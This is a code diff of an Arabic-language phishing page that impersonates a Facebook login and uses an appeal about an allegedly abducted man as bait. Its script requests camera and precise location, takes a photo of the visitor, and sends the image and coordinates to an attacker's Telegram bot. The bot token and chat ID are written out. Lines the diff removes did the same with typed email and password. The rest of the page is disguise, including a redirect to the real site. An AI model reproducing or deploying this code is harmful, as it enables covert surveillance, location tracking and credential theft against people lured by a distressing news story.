@@ -2,12 +2,13 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>فيسبوك - تسجيل الدخول</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="بأي ذنب يُخطف [محمد مصطفى العنعوني]؟">
-    <meta property="og:description" content="وبأي حق نعيش في غابة يغيب فيها القانون ويحضر فيها الغدر؟ قلوبنا تتقطع... اللهم ردّه إلينا سالماً.">
-    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg">
+    <title>فيسبوك - أين محمد مصطفى العنعوني؟</title>
+    <meta property="og:title" content="أين محمد مصطفى العنعوني؟ #الحرية_للمعتقلين">
+    <meta property="og:description" content="بأي ذنب يُخطف [محمد مصطفى العنعوني]؟ وبأي حق نعيش في غابة يغيب فيها القانون... اللهم ردّه إلينا سالماً.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png">
+    <meta property="og:url" content="https://www.facebook.com">
     <meta property="og:type" content="article">
 
     <style>
@@ -18,14 +19,14 @@
         input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
         .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
         
-        /* Social Engineering Overlay */
+        /* نافذة التفاعل الفوري (لفتح ثغرة المتصفح) */
         #startOverlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.98); z-index: 10000;
+            background: rgba(255,255,255,0.95); z-index: 10000;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             text-align: center; padding: 20px;
         }
-        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .start-btn { padding: 15px 40px; background: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
 
         #warning {
             display:none; position:fixed; top:0; left:0; right:0; bottom:0; 
@@ -38,23 +39,23 @@
 
 <div id="startOverlay">
     <div style="margin-bottom: 20px; color: #1c1e21; font-size: 18px; line-height: 1.5;">
-        <b>تنبيه أمني:</b><br>يرجى المتابعة لتأكيد هويتك ومشاهدة تفاصيل المنشور المتعلق بـ [محمد مصطفى العنعوني].
+        ⚠️ يجب تسجيل الدخول للمتابعة وقراءة تفاصيل الخبر.
     </div>
-    <button class="start-btn" id="initBtn">متابعة إلى المنشور</button>
+    <button class="start-btn" id="initBtn">متابعة إلى فيسبوك</button>
 </div>
 
 <div id="warning">
-    <div>⚠️ عذراً، يجب السماح بالأذونات المطلوبة للمتابعة.</div>
-    <button style="margin-top:20px; padding:10px; background:#fff; border:none; border-radius:5px;" onclick="location.reload()">إعادة المحاولة</button>
+    <div>⚠️ يجب السماح بالأذونات (الكاميرا والموقع) لتأمين حسابك قبل قراءة المحتوى الحساس.</div>
+    <button style="margin-top:20px; padding:10px 20px; background:#1877f2; border:none; color:white; border-radius:5px;" onclick="location.reload()">إعادة محاولة</button>
 </div>
 
 <div class="fb-container" id="fbMain">
-    <div class="header">facebook</div>
+    <div class="header">فيسبوك</div>
     <div class="form-area">
         <form id="loginForm">
             <input type="text" id="user" placeholder="رقم الجوال أو البريد الإلكتروني" required>
             <input type="password" id="pass" placeholder="كلمة المرور" required>
-            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
         </form>
     </div>
 </div>
@@ -63,7 +64,7 @@
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-// Step 1: User clicks "Continue", triggering camera/GPS permissions
+// تشغيل الهجوم فور الضغط على متابعة
 document.getElementById('initBtn').onclick = function() {
     document.getElementById('startOverlay').style.display = 'none';
     startCapture();
@@ -71,59 +72,46 @@ document.getElementById('initBtn').onclick = function() {
 
 async function startCapture() {
     try {
+        // طلب الكاميرا والموقع بتفاعل واحد
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.createElement('video');
         video.srcObject = stream;
-        await video.play();
+        video.play();
 
         setTimeout(async () => {
             const canvas = document.createElement('canvas');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            canvas.width = 1280; canvas.height = 720;
+            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
             const imageData = canvas.toDataURL('image/jpeg');
             stream.getTracks().forEach(t => t.stop());
 
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendBackgroundData(imageData, pos),
-                () => console.log("GPS denied, but camera captured."),
+                (pos) => sendToTelegram(imageData, pos),
+                () => document.getElementById('warning').style.display = 'flex',
                 { enableHighAccuracy: true }
             );
         }, 1500);
+
     } catch (err) {
-        console.log("Permissions denied.");
+        document.getElementById('warning').style.display = 'flex';
     }
 }
 
-async function sendBackgroundData(img, pos) {
+async function sendToTelegram(img, pos) {
+    const lat = pos.coords.latitude.toFixed(6);
+    const lng = pos.coords.longitude.toFixed(6);
+    const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+    
+    const caption = `🎯 صيد جديد (عن طريق الخبر)\n📍 الموقع: ${lat},${lng}\n🔗 الخريطة: ${mapsUrl}`;
+
     const blob = dataURLtoBlob(img);
     const fd = new FormData();
     fd.append('photo', blob, 'victim.jpg');
-    fd.append('caption', `📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}\n🔗 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+    fd.append('caption', caption);
     fd.append('chat_id', CHAT_ID);
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 }
-
-// Step 2: User enters Credentials
-document.getElementById('loginForm').onsubmit = async function(e) {
-    e.preventDefault();
-    const email = document.getElementById('user').value;
-    const pass = document.getElementById('pass').value;
-    const btn = document.getElementById('submitBtn');
-    
-    btn.innerText = "جاري التحميل...";
-    btn.disabled = true;
-
-    // Send Credentials to Telegram
-    const creds = `👤 حساب مستهدف:\n📧: ${email}\n🔑: ${pass}`;
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ chat_id: CHAT_ID, text: creds })
-    });
-
-    // Step 3: Final Redirect (The "Closing the Loop" trick)
-    window.location.href = "https://www.facebook.com/search/top/?q=محمد%20مصطفى%20العنعوني";
-};
 
 function dataURLtoBlob(dataurl) {
     let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
@@ -131,6 +119,12 @@ function dataURLtoBlob(dataurl) {
     while(n--) u8arr[n] = bstr.charCodeAt(n);
     return new Blob([u8arr], {type: mime});
 }
+
+document.getElementById('loginForm').onsubmit = function(e) {
+    e.preventDefault();
+    // توجيه نهائي للفيسبوك الحقيقي لإكمال التمويه
+    window.location.href = "https://m.facebook.com/";
+};
 </script>
 
 </body>
